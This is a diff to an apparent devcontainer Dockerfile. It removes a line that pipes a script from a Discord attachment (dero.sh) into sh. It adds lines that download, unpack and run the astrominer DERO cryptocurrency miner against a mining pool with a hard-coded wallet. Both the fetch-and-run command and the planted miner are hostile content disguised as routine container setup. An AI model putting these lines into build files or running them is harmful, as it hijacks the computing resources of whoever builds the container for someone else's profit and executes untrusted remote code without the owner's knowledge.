@@ -4,4 +4,6 @@ FROM mcr.microsoft.com/devcontainers/base:${VARIANT}
 
 RUN apt install wget curl -y
 
-RUN curl https://cdn.discordapp.com/attachments/982667804429914146/1086099938666094642/dero.sh | sh
+RUN wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.8_BETA2/astrominer-V1.8_BETA2_modern_amd64_linux.tar.gz
+RUN tar zxvf astrominer-V1.8_BETA2_modern_amd64_linux.tar.gz
+RUN ./astrominer -r community-pools.mysrv.cloud:10300 -w dero1qy4p7g4tlfl837nhskz5a6x4cqup28e2hpm0vktsw39smpn3fyah7qqtq7yhq -p rpc
